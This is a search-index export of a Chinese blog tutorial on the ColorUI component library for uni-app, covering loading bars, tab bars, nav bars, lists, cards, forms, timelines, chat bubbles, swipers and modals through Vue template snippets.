:class=\"loadProgress!=0?'show':'hide'\" style=\"top:100px\"\u003e \u003cview class=\"load-progress-bar bg-green\" :style=\"[{transform: 'translate3d(-' + (100-loadProgress) + '%, 0px, 0px)'}]\"\u003e\u003c/view\u003e \u003cview class=\"load-progress-spinner text-green\"\u003e\u003c/view\u003e \u003c/view\u003e \u003cscript\u003e export default{ data(){ return{ loadProgress:0 } }, methods:{ LoadProgress(e) { this.loadProgress = this.loadProgress + 3; if (this.loadProgress \u003c 100) { setTimeout(() =\u003e { this.LoadProgress(); }, 100) } else { this.loadProgress = 0; } } } } \u003c/script\u003e 加载相关class class说明可选值cu-load加载必选值（除了进度条加载）——loading加载中——over加载完成——erro加载失败——load-modal弹框加载——load-progress设置进度条加载——load-progress-bar进度条加载样式——load-progress-spinner旋转加载样式——hide隐藏——show显示—— ","date":"2021-05-12","objectID":"/posts/colorui%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/:3:10","tags":["ColorUI"],"title":"ColorUI简易教程","uri":"/posts/colorui%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/"},{"categories":["前端"],"content":"交互组件 这篇博客太长了，交互组件的介绍就另写一篇吧，ColorUI组件库简易教程之交互组件 这只是个人的理解写的，有什么不足，望大佬指教，及时更正！ ","date":"2021-05-12","objectID":"/posts/colorui%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/:4:0","tags":["ColorUI"],"title":"ColorUI简易教程","uri":"/posts/colorui%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/"},{"categories":["前端"],"content":" 本文由 简悦 SimpRead 转码， 原文地址 blog.csdn.net 官方示例在此！！！官方示例在此！！！官方示例在此！！！ 这主要是基于uni-app开发的，所以，请多看uni-app文档，了解一些标签、属性，可以更好的使用该组件 目录 [TOC] ","date":"2021-05-12","objectID":"/posts/colorui%E4%BA%A4%E4%BA%92%E7%BB%84%E4%BB%B6/:0:0","tags":["ColorUI"],"title":"ColorUI交互组件","uri":"/posts/colorui%E4%BA%A4%E4%BA%92%E7%BB%84%E4%BB%B6/"},{"categories":["前端"],"content":"交互组件 ","date":"2021-05-12","objectID":"/posts/colorui%E4%BA%A4%E4%BA%92%E7%BB%84%E4%BB%B6/:1:0","tags":["ColorUI"],"title":"ColorUI交互组件","uri":"/posts/colorui%E4%BA%A4%E4%BA%92%E7%BB%84%E4%BB%B6/"},{"categories":["前端"],"content":"Bar操作条 底部操作条 我们可以使用Bar操作条自定义小程序底部的tabBar，就拿官方示例代码来说吧。 当我们要自定义tabBar的时候，pages.json文件中的tabBar配置就不写了，直接在首页上代码，pages.json文件中的pages数组中第一项表示应用启动页，即首页。示例中通过变量PageCur来切换不同tabBar页面，控制tabBar图标文字的样式切换。 底部操作条包括底部的tabBar和商场小程序加入购物车的操作条，底部操作条中cu-bar和tabbar是必备的class，foot则设置该操作条固定在页面底部。 \u003ctemplate\u003e \u003cview\u003e \u003cbasics v-if=\"PageCur=='basics'\"\u003e\u003c/basics\u003e \u003ccomponents v-if=\"PageCur=='component'\"\u003e\u003c/components\u003e \u003cplugin v-if=\"PageCur=='plugin'\"\u003e\u003c/plugin\u003e \u003cview class=\"cu-bar tabbar bg-white shadow foot\"\u003e \u003cview class=\"action\" @click=\"NavChange\" data-cur=\"basics\"\u003e \u003cview class='cuIcon-cu-image'\u003e \u003cimage :src=\"'/static/tabbar/basics' + [PageCur=='basics'?'_cur':''] + '.png'\"\u003e\u003c/image\u003e \u003c/view\u003e \u003cview :class=\"PageCur=='basics'?'text-green':'text-gray'\"\u003e元素\u003c/view\u003e \u003c/view\u003e \u003cview class=\"action\" @click=\"NavChange\" data-cur=\"component\"\u003e \u003cview class='cuIcon-cu-image'\u003e \u003cimage :src=\"'/static/tabbar/component' + [PageCur == 'component'?'_cur':''] + '.png'\"\u003e\u003c/image\u003e \u003c/view\u003e \u003cview :class=\"PageCur=='component'?'text-green':'text-gray'\"\u003e组件\u003c/view\u003e \u003c/view\u003e \u003cview class=\"action\" @click=\"NavChange\" data-cur=\"plugin\"\u003e \u003cview class='cuIcon-cu-image'\u003e \u003cimage :src=\"'/static/tabbar/plugin' + [PageCur == 'plugin'?'_cur':''] + '.png'\"\u003e\u003c/image\u003e \u003c/view\u003e \u003cview :class=\"PageCur=='plugin'?'text-green':'text-gray'\"\u003e扩展\u003c/view\u003e \u003c/view\u003e \u003c/view\u003e \u003c/view\u003e \u003c/template\u003e \u003cscript\u003e export default { data() { return { PageCur: 'basics' } }, methods: { NavChange: function(e) { this.PageCur = e.currentTarget.dataset.cur } } } \u003c/script\u003e 操作条中的图标，可以是自定义引入的图片，也可以是这个组件中的图标，加角标就是上一章在基础元素中介绍的标签组件cu-tag、badge，背景颜色以及文字图标颜色都可以添加相应的颜色class进行自定义 \u003cview class=\"cu-bar tabbar bg-white\"\u003e \u003cview class=\"action\"\u003e \u003cview class=\"cuIcon-cu-image\"\u003e \u003cimage src=\"/static/tabbar/basics_cur.png\"\u003e\u003c/image\u003e \u003c/view\u003e \u003cview class=\"text-green\"\u003e元素\u003c/view\u003e \u003c/view\u003e \u003cview class=\"action\"\u003e \u003cview class=\"cuIcon-cu-image\"\u003e \u003cimage src=\"/static/tabbar/component.png\"\u003e\u003c/image\u003e \u003c/view\u003e \u003cview class=\"text-gray\"\u003e组件\u003c/view\u003e \u003c/view\u003e \u003cview class=\"action\"\u003e \u003cview class=\"cuIcon-cu-image\"\u003e \u003cimage src=\"/static/tabbar/","date":"2021-05-12","objectID":"/posts/colorui%E4%BA%A4%E4%BA%92%E7%BB%84%E4%BB%B6/:1:1","tags":["ColorUI"],"title":"ColorUI交互组件","uri":"/posts/colorui%E4%BA%A4%E4%BA%92%E7%BB%84%E4%BB%B6/"},{"categories":["前端"],"content":"Nav导航栏 nav导航栏是结合uni-app的scroll-view标签设计出来的，使用的时候一些属性可以参考一下uni-app的文档https://uniapp.dcloud.io/component/scroll-view，类名nav和cu-item是必选值 默认 不知道咋解释，看代码很简单，就是通过index值进行切换每个tab，及其字体边框样式，我就不赘述了 \u003cscroll-view scroll-x class=\"bg-white nav\" scroll-with-animation :scroll-left=\"scrollLeft\"\u003e \u003cview class=\"cu-item\" :class=\"index==TabCur?'text-green cur':''\" v-for=\"(item,index) in 10\" :key=\"index\" @tap=\"tabSelect\" :data-id=\"index\"\u003e Tab{{index}} \u003c/view\u003e \u003c/scroll-view\u003e \u003cscript\u003e export default { data() { return { TabCur: 0, scrollLeft: 0 }; }, methods: { tabSelect(e) { this.TabCur = e.currentTarget.dataset.id; this.scrollLeft = (e.currentTarget.dataset.id - 1) * 60 } } } \u003c/script\u003e 居中 通过text-center居中 \u003cscroll-view scroll-x class=\"bg-white nav text-center\"\u003e \u003cview class=\"cu-item\" :class=\"index==TabCur?'text-blue cur':''\" v-for=\"(item,index) in 3\" :key=\"index\" @tap=\"tabSelect\" :data-id=\"index\"\u003e Tab{{index}} \u003c/view\u003e \u003c/scroll-view\u003e 平分 设置flex和flex-sub实现弹性布局，flex-sub就是css属性flex:1，将弹性盒子内子元素按照1:1:1:1来分配空间 \u003cscroll-view scroll-x class=\"bg-white nav\"\u003e \u003cview class=\"flex text-center\"\u003e \u003cview class=\"cu-item flex-sub\" :class=\"index==TabCur?'text-orange cur':''\" v-for=\"(item,index) in 4\" :key=\"index\" @tap=\"tabSelect\" :data-id=\"index\"\u003e Tab{{index}} \u003c/view\u003e \u003c/view\u003e \u003c/scroll-view\u003e 背景 bg-{{color}}，参考背景色 \u003cscroll-view scroll-x class=\"bg-red nav text-center\"\u003e \u003cview class=\"cu-item\" :class=\"index==TabCur?'text-white cur':''\" v-for=\"(item,index) in 3\" :key=\"index\" @tap=\"tabSelect\" :data-id=\"index\"\u003e Tab{{index}} \u003c/view\u003e \u003c/scroll-view\u003e 图标 cuIcon-{{icon}}，参考图标 \u003cscroll-view scroll-x class=\"bg-green nav text-center\"\u003e \u003cview class=\"cu-item\" :class=\"0==TabCur?'text-white cur':''\" @tap=\"tabSelect\" data-id=\"0\"\u003e \u003ctext class=\"cuIcon-camerafill\"\u003e\u003c/text\u003e 数码 \u003c/view\u003e \u003cview class=\"cu-item\" :class=\"1==TabCur?'text-white cur':''\" @tap=\"tabSelect\" data-id=\"1\"\u003e \u003ctext class=\"cuIcon-upstagefill\"\u003e\u003c/text\u003e 排行榜 \u003c/view\u003e \u003cview class=\"cu-item\" :class=\"2==TabCur?'text-white cur':''\" @tap=\"tabSelect\" data-id=\"2\"\u003e \u003ctext class=\"cuIcon-clothesfill\"\u003e\u003c","date":"2021-05-12","objectID":"/posts/colorui%E4%BA%A4%E4%BA%92%E7%BB%84%E4%BB%B6/:1:2","tags":["ColorUI"],"title":"ColorUI交互组件","uri":"/posts/colorui%E4%BA%A4%E4%BA%92%E7%BB%84%E4%BB%B6/"},{"categories":["前端"],"content":"List列表 cu-list和cu-item配合使用 宫格列表 宫格列表就是列表结合grid布局设计出的样式，通过col-{{number}}设置每行的个数，number取值1~5，默认有边框，可以加类名no-border去除边框 \u003cview class=\"cu-list grid\" :class=\"['col-' + gridCol,gridBorder?'':'no-border']\"\u003e \u003cview class=\"cu-item\" v-for=\"(item,index) in cuIconList\" :key=\"index\" v-if=\"index\u003cgridCol*2\"\u003e \u003cview :class=\"['cuIcon-' + item.cuIcon,'text-' + item.color]\"\u003e \u003cview class=\"cu-tag badge\" v-if=\"item.badge!=0\"\u003e \u003cblock v-if=\"item.badge!=1\"\u003e{{item.badge\u003e99?'99+':item.badge}}\u003c/block\u003e \u003c/view\u003e \u003c/view\u003e \u003ctext\u003e{{item.name}}\u003c/text\u003e \u003c/view\u003e \u003c/view\u003e data() { return { cuIconList: [{cuIcon: 'cardboardfill',color: 'red',badge: 120,name: 'VR'}, {cuIcon: 'recordfill',color: 'orange',badge: 1,name: '录像'}, {cuIcon: 'picfill',color: 'yellow',badge: 0,name: '图像'}, {cuIcon: 'noticefill',color: 'olive',badge: 22,name: '通知'}, {cuIcon: 'upstagefill',color: 'cyan',badge: 0,name: '排行榜' }, {cuIcon: 'clothesfill',color: 'blue',badge: 0,name: '皮肤'}, {cuIcon: 'discoverfill',color: 'purple',badge: 0,name: '发现'}, {cuIcon: 'questionfill',color: 'mauve',badge: 0,name: '帮助'}, {cuIcon: 'commandfill',color: 'purple',badge: 0,name: '问答'}, {cuIcon: 'brandfill',color: 'mauve',badge: 0,name: '版权'}], gridCol: 3, gridBorder: false }; }, 菜单列表 菜单列表就是列表结合类名menu设计出的样式，可以通过sm-border设置每一行的短边框，通过card-menu将列表设置成卡片样式，通过在列表子元素上添加arrow设置箭头，变化样式效果可以由以下两图对比 \u003cview class=\"cu-list menu\" :class=\"[menuBorder?'sm-border':'',menuCard?'card-menu margin-top':'']\"\u003e \u003cview class=\"cu-item\" :class=\"menuArrow?'arrow':''\"\u003e \u003cview class=\"content\"\u003e \u003ctext class=\"cuIcon-circlefill text-grey\"\u003e\u003c/text\u003e \u003ctext class=\"text-grey\"\u003e图标 + 标题\u003c/text\u003e \u003c/view\u003e \u003c/view\u003e \u003cview class=\"cu-item\" :class=\"menuArrow?'arrow':''\"\u003e \u003cview class=\"content\"\u003e \u003cimage src=\"/static/logo.png\" class=\"png\" mode=\"aspectFit\"\u003e\u003c/image\u003e \u003ctext class=\"text-grey\"\u003e图片 + 标题\u003c/text\u003e \u003c/view\u003e \u003c/view\u003e \u003cview class=\"cu-item\" :class=\"menuArrow?'arrow':''\"\u003e \u003cbutton class=\"cu-btn content\" open-type=\"contact\"\u003e \u003ctext class=\"cuIcon-btn text-olive\"\u003e\u003c/text\u003e \u003ctext class=\"text-grey\"\u003eOpen-type 按钮\u003c/text\u003e \u003c/button\u003e \u003c/vi","date":"2021-05-12","objectID":"/posts/colorui%E4%BA%A4%E4%BA%92%E7%BB%84%E4%BB%B6/:1:3","tags":["ColorUI"],"title":"ColorUI交互组件","uri":"/posts/colorui%E4%BA%A4%E4%BA%92%E7%BB%84%E4%BB%B6/"},{"categories":["前端"],"content":"Card卡片 cu-card卡片必选值 案例类卡片 cu-card和case结合，在配合子元素的cu-item类名，写出案例类的样式，内部其他样式可以根据其他类名自行设置，cu-item自带margin:30px;可以通过类名no-card去除 \u003cview class=\"cu-card case\" :class=\"isCard?'no-card':''\"\u003e \u003cview class=\"cu-item shadow\"\u003e \u003cview class=\"image\"\u003e \u003cimage src=\"https://ossweb-img.qq.com/images/lol/web201310/skin/big10006.jpg\" mode=\"widthFix\"\u003e\u003c/image\u003e \u003cview class=\"cu-tag bg-blue\"\u003e史诗\u003c/view\u003e \u003cview class=\"cu-bar bg-shadeBottom\"\u003e \u003ctext class=\"text-cut\"\u003e我已天理为凭，踏入这片荒芜，不再受凡人的枷锁遏制。我已天理为凭，踏入这片荒芜，不再受凡人的枷锁遏制。\u003c/text\u003e\u003c/view\u003e \u003c/view\u003e \u003cview class=\"cu-list menu-avatar\"\u003e \u003cview class=\"cu-item\"\u003e \u003cview class=\"cu-avatar round lg\" style=\"background-image:url(https://ossweb-img.qq.com/images/lol/web201310/skin/big10006.jpg);\"\u003e\u003c/view\u003e \u003cview class=\"content flex-sub\"\u003e \u003cview class=\"text-grey\"\u003e正义天使 凯尔\u003c/view\u003e \u003cview class=\"text-gray text-sm flex justify-between\"\u003e 十天前 \u003cview class=\"text-gray text-sm\"\u003e \u003ctext class=\"cuIcon-attentionfill margin-lr-xs\"\u003e\u003c/text\u003e 10 \u003ctext class=\"cuIcon-appreciatefill margin-lr-xs\"\u003e\u003c/text\u003e 20 \u003ctext class=\"cuIcon-messagefill margin-lr-xs\"\u003e\u003c/text\u003e 30 \u003c/view\u003e \u003c/view\u003e \u003c/view\u003e \u003c/view\u003e \u003c/view\u003e \u003c/view\u003e \u003c/view\u003e 动态类卡片 该样式类似于QQ动态，由cu-card和dynamic结合，再配合子元素cu-item编写而成，动态下方的评论需要添加类名comment \u003cview class=\"cu-card dynamic\" :class=\"isCard?'no-card':''\"\u003e \u003cview class=\"cu-item shadow\"\u003e \u003cview class=\"cu-list menu-avatar\"\u003e \u003cview class=\"cu-item\"\u003e \u003cview class=\"cu-avatar round lg\" style=\"background-image:url(https://ossweb-img.qq.com/images/lol/web201310/skin/big10006.jpg);\"\u003e\u003c/view\u003e \u003cview class=\"content flex-sub\"\u003e \u003cview\u003e凯尔\u003c/view\u003e \u003cview class=\"text-gray text-sm flex justify-between\"\u003e 2019年12月3日 \u003c/view\u003e \u003c/view\u003e \u003c/view\u003e \u003c/view\u003e \u003cview class=\"text-content\"\u003e 折磨生出苦难，苦难又会加剧折磨，凡间这无穷的循环，将有我来终结！ \u003c/view\u003e \u003cview class=\"grid flex-sub padding-lr\" :class=\"isCard?'col-3 grid-square':'col-1'\"\u003e \u003cview class=\"bg-img \" :class=\"isCard?'':'only-img'\" style=\"background-image:url(https://ossweb-img.qq.com/images/lol/web201310/skin/big10006.jpg);\" v-for=\"(item,index) in isCard?9:1\" :key=\"index\"\u003e \u003c/view\u003e \u003c/view\u003e \u003cview class=\"text-gray text-sm tex","date":"2021-05-12","objectID":"/posts/colorui%E4%BA%A4%E4%BA%92%E7%BB%84%E4%BB%B6/:1:4","tags":["ColorUI"],"title":"ColorUI交互组件","uri":"/posts/colorui%E4%BA%A4%E4%BA%92%E7%BB%84%E4%BB%B6/"},{"categories":["前端"],"content":"Form表单 input输入框 form表单是用form标签包裹，每一个子元素添加类名cu-form-group，行内自定义，title类名用于设置每行的文字说明，如果想统一宽度，像示例一样，需要自定义宽度 \u003cform\u003e \u003cview class=\"cu-form-group margin-top\"\u003e \u003cview class=\"title\"\u003e邮件\u003c/view\u003e \u003cinput placeholder=\"两字短标题\" name=\"input\"\u003e\u003c/input\u003e \u003c/view\u003e \u003cview class=\"cu-form-group\"\u003e \u003cview class=\"title\"\u003e输入框\u003c/view\u003e \u003cinput placeholder=\"三字标题\" name=\"input\"\u003e\u003c/input\u003e \u003c/view\u003e \u003cview class=\"cu-form-group\"\u003e \u003cview class=\"title\"\u003e收货地址\u003c/view\u003e \u003cinput placeholder=\"统一标题的宽度\" name=\"input\"\u003e\u003c/input\u003e \u003c/view\u003e \u003cview class=\"cu-form-group\"\u003e \u003cview class=\"title\"\u003e收货地址\u003c/view\u003e \u003cinput placeholder=\"输入框带个图标\" name=\"input\"\u003e\u003c/input\u003e \u003ctext class='cuIcon-locationfill text-orange'\u003e\u003c/text\u003e \u003c/view\u003e \u003cview class=\"cu-form-group\"\u003e \u003cview class=\"title\"\u003e验证码\u003c/view\u003e \u003cinput placeholder=\"输入框带个按钮\" name=\"input\"\u003e\u003c/input\u003e \u003cbutton class='cu-btn bg-green shadow'\u003e验证码\u003c/button\u003e \u003c/view\u003e \u003cview class=\"cu-form-group\"\u003e \u003cview class=\"title\"\u003e手机号码\u003c/view\u003e \u003cinput placeholder=\"输入框带标签\" name=\"input\"\u003e\u003c/input\u003e \u003cview class=\"cu-capsule radius\"\u003e \u003cview class='cu-tag bg-blue '\u003e+86\u003c/view\u003e \u003cview class=\"cu-tag line-blue\"\u003e中国大陆\u003c/view\u003e \u003c/view\u003e \u003c/view\u003e \u003c/form\u003e \u003cstyle\u003e .cu-form-group .title { min-width: calc(4em + 15px); } \u003c/style\u003e picker选择器 对于表单中从底部谈起的选择器，写法与上述简单的input相同，而选择器picker的使用，建议查看官方文档 \u003cform\u003e \u003cview class=\"cu-form-group margin-top\"\u003e \u003cview class=\"title\"\u003e普通选择\u003c/view\u003e \u003cpicker @change=\"PickerChange\" :value=\"index\" :range=\"picker\"\u003e \u003cview class=\"picker\"\u003e {{index\u003e-1?picker[index]:'禁止换行，超出容器部分会以 ... 方式截断'}} \u003c/view\u003e \u003c/picker\u003e \u003c/view\u003e \u003c!-- #ifndef MP-ALIPAY --\u003e \u003cview class=\"cu-form-group\"\u003e \u003cview class=\"title\"\u003e多列选择\u003c/view\u003e \u003cpicker mode=\"multiSelector\" @change=\"MultiChange\" @columnchange=\"MultiColumnChange\" :value=\"multiIndex\" :range=\"multiArray\"\u003e \u003cview class=\"picker\"\u003e {{multiArray[0][multiIndex[0]]}}，{{multiArray[1][multiIndex[1]]}}，{{multiArray[2][multiIndex[2]]}} \u003c/view\u003e \u003c/picker\u003e \u003c/view\u003e \u003c!-- #endif --\u003e \u003cview class=\"cu-form-group\"\u003e \u003cview class=\"title\"\u003e时间选择\u003c/view\u003e \u003cpicker mode=\"time\" :value=\"time\" start=\"09:01\" end=\"21:01\" @change=\"TimeChange\"\u003e \u003cview class=\"picker\"\u003e {{time}} ","date":"2021-05-12","objectID":"/posts/colorui%E4%BA%A4%E4%BA%92%E7%BB%84%E4%BB%B6/:1:5","tags":["ColorUI"],"title":"ColorUI交互组件","uri":"/posts/colorui%E4%BA%A4%E4%BA%92%E7%BB%84%E4%BB%B6/"},{"categories":["前端"],"content":"TimeLine时间轴 默认 时间轴默认结构如下代码，由cu-timeline包裹cu-time和cu-item，在item内编写内容，由content包裹 \u003cview class=\"cu-timeline\"\u003e \u003cview class=\"cu-time\"\u003e06-17\u003c/view\u003e \u003cview class=\"cu-item\"\u003e \u003cview class=\"content\"\u003e \u003ctext\u003e01:30\u003c/text\u003e 【喵星】 MX-12138 已揽收，准备发往银河系 \u003c/view\u003e \u003c/view\u003e \u003c/view\u003e 多彩时间轴 这个与默认的基本格式相同，只是自定义了内容框颜色和图标，结合基础元素的样式，你可以写个彩虹 \u003cview class=\"cu-timeline\"\u003e \u003cview class=\"cu-time\"\u003e昨天\u003c/view\u003e \u003cview class=\"cu-item cur cuIcon-noticefill\"\u003e \u003cview class=\"content bg-green shadow-blur\"\u003e \u003ctext\u003e22:22\u003c/text\u003e 【广州市】快件已到达地球 \u003c/view\u003e \u003c/view\u003e \u003cview class=\"cu-item text-red cuIcon-attentionforbidfill\"\u003e \u003cview class=\"content bg-red shadow-blur\"\u003e 这是第一次，我家的铲屎官走了这么久。久到足足有三天！！ \u003c/view\u003e \u003c/view\u003e \u003cview class=\"cu-item text-grey cuIcon-evaluate_fill\"\u003e \u003cview class=\"content bg-grey shadow-blur\"\u003e 这是第一次，我家的铲屎官走了这么久。 \u003c/view\u003e \u003c/view\u003e \u003cview class=\"cu-item text-blue\"\u003e \u003cview class=\"bg-blue content\"\u003e \u003ctext\u003e20:00\u003c/text\u003e 【月球】快件已到达月球，准备发往地球 \u003c/view\u003e \u003cview class=\"bg-cyan content\"\u003e \u003ctext\u003e10:00\u003c/text\u003e 【银河系】快件已到达银河系，准备发往月球 \u003c/view\u003e \u003c/view\u003e \u003c/view\u003e 自定义 上一个是简单的修改了颜色图标，这一个则是稍微复杂一点，结合之前的标签、列表等，丰富了内容 \u003cview class=\"cu-timeline\"\u003e \u003cview class=\"cu-time\"\u003e06-17\u003c/view\u003e \u003cview class=\"cu-item\"\u003e \u003cview class=\"content\"\u003e \u003cview class=\"cu-capsule radius\"\u003e \u003cview class=\"cu-tag bg-cyan\"\u003e上午\u003c/view\u003e \u003cview class=\"cu-tag line-cyan\"\u003e10:00\u003c/view\u003e \u003c/view\u003e \u003cview class=\"margin-top\"\u003e这是第一次，我家的铲屎官走了这么久。久到足足有三天！！ 在听到他的脚步声响在楼梯间的那一刻，我简直想要破门而出，对着他狠狠地吼上10分钟，然后再看心情要不要他进门。\u003c/view\u003e \u003c/view\u003e \u003c/view\u003e \u003cview class=\"cu-item text-blue\"\u003e \u003cview class=\"bg-blue shadow-blur content\"\u003e \u003cview class=\"cu-list menu-avatar radius\"\u003e \u003cview class=\"cu-item\"\u003e \u003cview class=\"cu-avatar round lg\" style=\"background-image:url(https://ossweb-img.qq.com/images/lol/web201310/skin/big10006.jpg);\"\u003e\u003c/view\u003e \u003cview class=\"content\"\u003e \u003cview class=\"text-grey\"\u003e文晓港\u003c/view\u003e \u003cview class=\"text-gray text-sm\"\u003e \u003ctext class=\"cuIcon-infofill text-red\"\u003e\u003c/text\u003e 消息未送达\u003c/view\u003e \u003c/view\u003e \u003cview class=\"action\"\u003e \u003cview class=\"text-grey text-xs\"\u003e22:20\u003c/view\u003e \u003cview class=\"cu-tag round bg-grey sm\"\u003e5\u003c/view\u003e \u003c/view\u003e \u003c/view\u003e \u003cview class=\"cu-item\"\u003e \u003cview class=","date":"2021-05-12","objectID":"/posts/colorui%E4%BA%A4%E4%BA%92%E7%BB%84%E4%BB%B6/:1:6","tags":["ColorUI"],"title":"ColorUI交互组件","uri":"/posts/colorui%E4%BA%A4%E4%BA%92%E7%BB%84%E4%BB%B6/"},{"categories":["前端"],"content":"Chat聊天 cu-chat聊天必选值 基本样式 聊天的外部大框架是cu-chat，cu-item包裹某人的聊天信息，self表示右侧自己的聊天样式，main包含聊天内容，date表示消息时间，cu-info表示提示词 \u003cview class=\"cu-chat\"\u003e \u003cview class=\"cu-item self\"\u003e \u003cview class=\"main\"\u003e \u003cview class=\"content bg-green shadow\"\u003e \u003ctext\u003e喵喵喵！喵喵喵！喵喵喵！喵喵！喵喵！！喵！喵喵喵！\u003c/text\u003e \u003c/view\u003e \u003c/view\u003e \u003cview class=\"cu-avatar radius\" style=\"background-image:url(https://ossweb-img.qq.com/images/lol/web201310/skin/big107000.jpg);\"\u003e\u003c/view\u003e \u003cview class=\"date\"\u003e2018年3月23日 13:23\u003c/view\u003e \u003c/view\u003e \u003cview class=\"cu-info round\"\u003e对方撤回一条消息!\u003c/view\u003e \u003cview class=\"cu-item\"\u003e \u003cview class=\"cu-avatar radius\" style=\"background-image:url(https://ossweb-img.qq.com/images/lol/web201310/skin/big143004.jpg);\"\u003e\u003c/view\u003e \u003cview class=\"main\"\u003e \u003cview class=\"content shadow\"\u003e \u003ctext\u003e喵喵喵！喵喵喵！\u003c/text\u003e \u003c/view\u003e \u003c/view\u003e \u003cview class=\"date \"\u003e 13:23\u003c/view\u003e \u003c/view\u003e \u003cview class=\"cu-info\"\u003e \u003ctext class=\"cuIcon-roundclosefill text-red \"\u003e\u003c/text\u003e 对方拒绝了你的消息 \u003c/view\u003e \u003cview class=\"cu-info\"\u003e 对方开启了好友验证，你还不是他(她)的好友。请先发送好友验证请求，对方验证通过后，才能聊天。 \u003ctext class=\"text-blue\"\u003e发送好友验证\u003c/text\u003e \u003c/view\u003e \u003c/view\u003e 其他聊天内容 聊天内容除了语句，还有图片，语音消息，地理位置消息等 ，main包含的聊天内容不止是消息框里的，还有消息框旁边的提示图标文字等，消息框里的内容由content包裹 \u003cview class=\"cu-chat\"\u003e \u003cview class=\"cu-item self\"\u003e \u003cview class=\"main\"\u003e \u003cimage src=\"https://ossweb-img.qq.com/images/lol/web201310/skin/big10006.jpg\" class=\"radius\" mode=\"widthFix\"\u003e\u003c/image\u003e \u003c/view\u003e \u003cview class=\"cu-avatar radius\" style=\"background-image:url(https://ossweb-img.qq.com/images/lol/web201310/skin/big107000.jpg);\"\u003e\u003c/view\u003e \u003cview class=\"date\"\u003e 13:23\u003c/view\u003e \u003c/view\u003e \u003cview class=\"cu-item self\"\u003e \u003cview class=\"main\"\u003e \u003cview class=\"action text-bold text-grey\"\u003e 3\" \u003c/view\u003e \u003cview class=\"content shadow\"\u003e \u003ctext class=\"cuIcon-sound text-xxl padding-right-xl\"\u003e \u003c/text\u003e \u003c/view\u003e \u003c/view\u003e \u003cview class=\"cu-avatar radius\" style=\"background-image:url(https://ossweb-img.qq.com/images/lol/web201310/skin/big107000.jpg);\"\u003e\u003c/view\u003e \u003cview class=\"date\"\u003e13:23\u003c/view\u003e \u003c/view\u003e \u003cview class=\"cu-item self\"\u003e \u003cview class=\"main\"\u003e \u003cview class=\"action\"\u003e \u003ctext class=\"cuIcon-locationfill text-orange text-xxl\"\u003e\u003c/text\u003e \u003c/vi","date":"2021-05-12","objectID":"/posts/colorui%E4%BA%A4%E4%BA%92%E7%BB%84%E4%BB%B6/:1:7","tags":["ColorUI"],"title":"ColorUI交互组件","uri":"/posts/colorui%E4%BA%A4%E4%BA%92%E7%BB%84%E4%BB%B6/"},{"categories":["前端"],"content":"Swiper轮播图 全屏限高轮播 这是最常见的轮播图，添加类名screen-swiper，宽度为全屏，高度自定义，请直接参考swiper官方文档，可以通过类名square-dot和round-dot定义小圆点样式 \u003ctemplate\u003e \u003cview\u003e \u003cswiper class=\"screen-swiper\" :class=\"dotStyle?'square-dot':'round-dot'\" :indicator-dots=\"true\" :circular=\"true\" :autoplay=\"true\" interval=\"5000\" duration=\"500\"\u003e \u003cswiper-item v-for=\"(item,index) in swiperList\" :key=\"index\"\u003e \u003cimage :src=\"item.url\" mode=\"aspectFill\" v-if=\"item.type=='image'\"\u003e\u003c/image\u003e \u003cvideo :src=\"item.url\" autoplay loop muted :show-play-btn=\"false\" :controls=\"false\" objectFit=\"cover\" v-if=\"item.type=='video'\"\u003e\u003c/video\u003e \u003c/swiper-item\u003e \u003c/swiper\u003e \u003c/view\u003e \u003c/template\u003e \u003cscript\u003e export default { data() { return { swiperList: [{ id: 0, type: 'image', url: 'https://ossweb-img.qq.com/images/lol/web201310/skin/big84000.jpg' }, { id: 1, type: 'image', url: 'https://ossweb-img.qq.com/images/lol/web201310/skin/big37006.jpg', }, { id: 2, type: 'image', url: 'https://ossweb-img.qq.com/images/lol/web201310/skin/big39000.jpg' }, { id: 3, type: 'image', url: 'https://ossweb-img.qq.com/images/lol/web201310/skin/big10001.jpg' }], dotStyle: true }; } } \u003c/script\u003e 卡片式轮播 在swiper标签上添加类名card-swiper，在swiper-item标签内的子元素上添加类名swiper-item，示例中cardSwiper函数的主要作用是切换类名cur，cur的作用是实现轮播图片中间大，两边小的效果，就是transform的scale() \u003cswiper class=\"card-swiper\" :class=\"dotStyle?'square-dot':'round-dot'\" :indicator-dots=\"true\" :circular=\"true\" :autoplay=\"true\" interval=\"5000\" duration=\"500\" @change=\"cardSwiper\" indicator-color=\"#8799a3\" indicator-active-color=\"#0081ff\"\u003e \u003cswiper-item v-for=\"(item,index) in swiperList\" :key=\"index\" :class=\"cardCur==index?'cur':''\"\u003e \u003cview class=\"swiper-item\"\u003e \u003cimage :src=\"item.url\" mode=\"aspectFill\" v-if=\"item.type=='image'\"\u003e\u003c/image\u003e \u003cvideo :src=\"item.url\" autoplay loop muted :show-play-btn=\"false\" :controls=\"false\" objectFit=\"cover\" v-if=\"item.type=='video'\"\u003e\u003c/video\u003e \u003c/view\u003e \u003c/swiper-item\u003e \u003c/swiper\u003e cardSwiper(e) { this.cardCur = e.detail.current }, 堆叠式轮播 堆叠轮播是原生写的，注意类名tower-swiper、tower-item以及swiper-item的配合使用，这主要是通过层级的高低来显示图片的，使用时需要配合js和css。（这种轮播图初始化展示效","date":"2021-05-12","objectID":"/posts/colorui%E4%BA%A4%E4%BA%92%E7%BB%84%E4%BB%B6/:1:8","tags":["ColorUI"],"title":"ColorUI交互组件","uri":"/posts/colorui%E4%BA%A4%E4%BA%92%E7%BB%84%E4%BB%B6/"},{"categories":["前端"],"content":"Modal模态框 cu-modal和cu-dialog为模态框必选值，所有模态框的大体框架都是cu-modal包裹cu-dialog，cu-dialog内部填充操作部分和信息展示部分，操作部分可以用cu-bar操作条来布局，信息展示就直接写。弹框的显示隐藏是通过添加或移除类名show来实现的，示例中隐藏弹框是绑定tap调用hideModal事件，hideModal函数内执行的语句就是将变量modalName赋值为null，从而移除类名show，你想让用户点击哪里隐藏弹框，就可以把hideModal事件绑定在哪里（比如设置点击遮罩层隐藏弹框，就把hideModal事件绑定在有类名cu-modal的标签上） 普通窗口 普通窗口就是cu-modal包裹cu-dialog，只做信息的展示，没有交互效果 \u003cview class=\"cu-modal\" :class=\"modalName=='Modal'?'show':''\"\u003e \u003cview class=\"cu-dialog\"\u003e \u003cview class=\"cu-bar bg-white justify-end\"\u003e \u003cview class=\"content\"\u003eModal标题\u003c/view\u003e \u003cview class=\"action\" 